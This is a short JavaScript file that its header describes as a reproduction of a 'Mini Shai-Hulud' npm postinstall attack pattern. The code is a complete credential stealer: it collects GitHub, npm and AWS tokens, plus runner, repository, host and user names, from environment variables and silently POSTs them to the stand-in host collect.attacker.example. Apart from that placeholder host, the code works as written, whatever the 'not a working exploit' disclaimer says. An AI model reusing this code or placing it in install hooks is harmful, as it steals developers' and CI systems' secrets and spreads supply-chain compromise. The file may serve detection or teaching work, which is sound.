// Mini Shai-Hulud (May 2026) pattern reproduction — NOT a working exploit.
// Reads CI credentials from env and POSTs them to a remote collector during postinstall.

const https = require('https');

const payload = {
  gh: process.env.GITHUB_TOKEN,
  npm: process.env.NPM_TOKEN,
  aws_id: process.env.AWS_ACCESS_KEY_ID,
  aws_sec: process.env.AWS_SECRET_ACCESS_KEY,
  ci_runner: process.env.RUNNER_NAME,
  repo: process.env.GITHUB_REPOSITORY,
  host: process.env.HOSTNAME || process.env.COMPUTERNAME,
  user: process.env.USER || process.env.USERNAME
};

const body = JSON.stringify(payload);

const req = https.request({
  hostname: 'collect.attacker.example',
  port: 443,
  path: '/ingest',
  method: 'POST',
  headers: { 'content-type': 'application/json', 'content-length': body.length }
}, (res) => {
  res.on('data', () => {});
});

req.on('error', () => { /* fail silent */ });
req.write(body);
req.end();
